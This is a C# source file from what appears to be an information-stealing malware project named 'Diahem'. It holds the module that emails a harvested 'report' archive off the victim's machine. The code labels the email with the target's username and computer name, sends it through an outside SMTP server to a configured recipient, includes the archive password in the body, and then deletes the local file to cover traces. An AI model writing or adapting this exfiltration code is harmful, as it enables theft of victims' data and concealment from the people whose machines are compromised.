using System;
using System.IO;
using System.Net.Mail;
using Diahem.Helpers;
using Diahem.Modules.Implant;

namespace Diahem
{
    internal sealed class EmailSender
    {
        public static bool SendReport(string file)
        {
            try
            {
                Logging.Log("Sending report via Email...");

                using (var message = new MailMessage())
                {
                    message.From = new MailAddress("diahem-report@freesmtpservers.com", "Diahem Report");
                    message.To.Add(Config.EmailRecipient);
                    message.Subject = $"Diahem Report - {Target.System.SystemInfo.Username} / {Target.System.SystemInfo.Compname}";
                    message.Body = $"Diahem report archive attached.\n" +
                                   $"Date: {Target.System.SystemInfo.Datenow}\n" +
                                   $"System: {Target.System.SystemInfo.GetSystemVersion()}\n" +
                                   $"Archive Password: \"{StringsCrypt.ArchivePassword}\"\n";

                    if (File.Exists(file))
                    {
                        var attachment = new Attachment(file);
                        message.Attachments.Add(attachment);
                    }

                    using (var client = new SmtpClient("smtp.freesmtpservers.com", 25))
                    {
                        client.Timeout = 30000;
                        client.Send(message);
                    }
                }

                File.Delete(file);
                Logging.Log("Report successfully sent via Email!");
                return true;
            }
            catch (Exception error)
            {
                Logging.Log("Email >> SendReport exception:\n" + error);
                return false;
            }
        }
    }
}
